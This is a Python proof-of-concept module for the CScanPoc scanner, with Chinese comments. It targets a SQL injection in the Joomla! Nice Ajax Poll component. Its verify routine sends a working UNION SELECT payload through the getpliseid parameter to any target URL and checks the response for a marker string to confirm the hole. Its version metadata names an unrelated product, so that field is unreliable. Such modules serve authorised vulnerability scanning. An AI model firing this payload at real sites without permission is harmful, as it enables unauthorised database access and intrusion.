# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0033'  # 平台漏洞编号，留空
    name = 'Joomla! com_Nice Ajax Poll 1.4.0 组件SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-12-30'  # 漏洞公布时间
    desc = '''
        Joomla! /index.php 存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.sebug.net/vuldb/ssvid-90196'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Shape 5 MP3 Player 2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2d79b594-04e8-4cd8-90a2-13f2694f7958'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/index.php/?option=com_niceajaxpoll&getpliseid=-6725%20UNION%20ALL%20SELECT%2094,94,CONCAT(0x71626a7671,0x5759706d737349577448575a6f5553684e4d4b70506a4b436f785a78677557674267524475744468,0x71766b6271),94#'
            url = arg + payload
            code, head, res, errcode, _url = hh.http(url)
            if code == 200 and 'qbjvqWYpmssIWtHWZoUShNMKpPjKCoxZxguWgBgRDutDhqvkbq' in res:
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
